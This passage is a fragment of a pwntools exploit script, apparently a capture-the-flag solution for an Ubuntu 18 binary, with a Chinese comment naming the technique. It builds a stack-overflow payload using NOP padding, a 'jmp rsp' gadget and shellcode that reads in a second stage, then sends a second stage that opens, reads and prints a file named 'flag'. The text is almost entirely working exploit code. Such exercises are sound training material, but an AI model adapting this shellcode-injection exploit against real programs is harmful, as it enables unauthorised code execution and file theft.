...
# ubuntu18 利用shellcode jmp rsp
# 0x0000000000400a01 : jmp rsp
payload = (asm(shellcraft.read(0, 0x123000, 0x100)) + asm('mov rax, 0x123000;call rax')).ljust(0x28, b'\x90') + p64(0x400a01) + asm('sub rsp, 0x30;jmp rsp')

io.recv()
print(payload, hex(len(payload)))
io.send(payload)

payload = shellcraft.open('flag', 0) + shellcraft.read(3, 0x123300, 0x30) + shellcraft.write(1, 0x123300, 0x30)
